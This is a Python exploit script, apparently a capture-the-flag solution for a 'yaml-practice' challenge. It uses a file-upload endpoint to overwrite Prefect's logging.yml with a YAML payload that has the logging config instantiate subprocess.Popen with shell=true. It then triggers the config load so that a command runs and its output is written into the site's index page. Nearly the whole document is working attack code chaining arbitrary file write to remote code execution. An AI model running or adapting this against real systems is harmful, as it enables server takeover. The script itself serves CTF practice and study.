#!/usr/bin/env python3
import argparse
import json
import sys
import time
from typing import Optional

import requests


def upload_yaml(base_url: str, filename: str, content: str) -> requests.Response:
    return requests.post(
        f"{base_url}/upload",
        files={"file": (filename, content.encode(), "text/plain")},
        timeout=30,
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit yaml-practice")
    parser.add_argument("base_url", help="e.g. http://host:8000")
    parser.add_argument(
        "--logging-path",
        default="/app/.venv/lib/python3.14/site-packages/prefect/logging/logging.yml",
        help="Path to Prefect logging.yml inside the target container",
    )
    parser.add_argument(
        "--view-path",
        default="/",
        help="Page to request after triggering the bug",
    )
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    s = requests.Session()

    benign_name = "a.yml"
    benign_body = "a: 1\n"

    print("[+] Uploading benign YAML...")
    r = upload_yaml(base_url, benign_name, benign_body)
    print(r.status_code, r.text)
    r.raise_for_status()

    payload = (
        "version: 1\n"
        "handlers: {h: {(): subprocess.Popen, args: /readflag give me the flag>/app/templates/index.html, shell: true}}\n"
        "root: {level: INFO, handlers: [h]}\n"
    )
    print(f"[+] Payload length: {len(payload)} bytes")

    print("[+] Overwriting Prefect logging config...")
    r = upload_yaml(base_url, args.logging_path, payload)
    print(r.status_code, r.text)
    r.raise_for_status()

    print("[+] Triggering /validate (500 or timeout is acceptable)...")
    try:
        r = s.post(
            f"{base_url}/validate",
            json={"filename": benign_name},
            timeout=35,
        )
        print(r.status_code, r.text[:200])
    except requests.RequestException as exc:
        print(f"[!] validate request ended with exception: {exc}")

    time.sleep(1)

    print("[+] Fetching page that should now contain the flag...")
    r = s.get(f"{base_url}{args.view_path}", timeout=15)
    print(r.status_code)
    print(r.text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
